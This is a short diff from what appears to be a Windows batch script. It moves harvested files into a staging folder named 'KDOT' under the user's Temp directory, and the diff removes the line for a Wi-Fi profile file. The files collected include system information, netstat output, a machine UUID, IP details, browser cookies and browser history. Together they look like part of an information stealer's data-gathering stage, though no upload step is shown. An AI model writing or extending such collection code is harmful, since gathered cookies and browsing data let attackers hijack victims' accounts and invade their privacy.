@@ -64,7 +64,6 @@ move %localappdata%\Temp\sysi.txt %localappdata%\Temp\KDOT\sysi.txt
 move %localappdata%\Temp\System_INFO.txt %localappdata%\Temp\KDOT\System_INFO.txt
 move %localappdata%\Temp\netstat.txt %localappdata%\Temp\KDOT\netstat.txt
 move %localappdata%\Temp\uuid.txt %localappdata%\Temp\KDOT\uuid.txt
-move %localappdata%\Temp\wlan.txt %localappdata%\Temp\KDOT\wlan.txt
 move %localappdata%\Temp\ipp.txt %localappdata%\Temp\KDOT\ipp.txt
 move %localappdata%\Temp\browser-cookies.txt %localappdata%\Temp\KDOT\browser-cookies.txt
 move %localappdata%\Temp\browser-history.txt %localappdata%\Temp\KDOT\browser-history.txt
